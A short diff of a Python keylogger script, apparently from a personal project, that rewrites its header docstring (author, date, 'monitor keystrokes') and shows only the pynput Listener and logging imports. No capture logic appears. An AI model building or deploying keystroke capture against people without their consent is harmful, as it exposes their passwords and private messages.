@@ -1,8 +1,11 @@
-'''
-keyboard logger with python
-Prints every key stroke &
-also stores them in file
-'''
+"""
+    Keyboard Logger
+    - Keylogger that monitor keystrokes
+
+    Author : Kruze Zab [github hyperlink]
+    Date : 1/10/21
+"""
+
 from pynput.keyboard import Key, Listener
 import logging
 
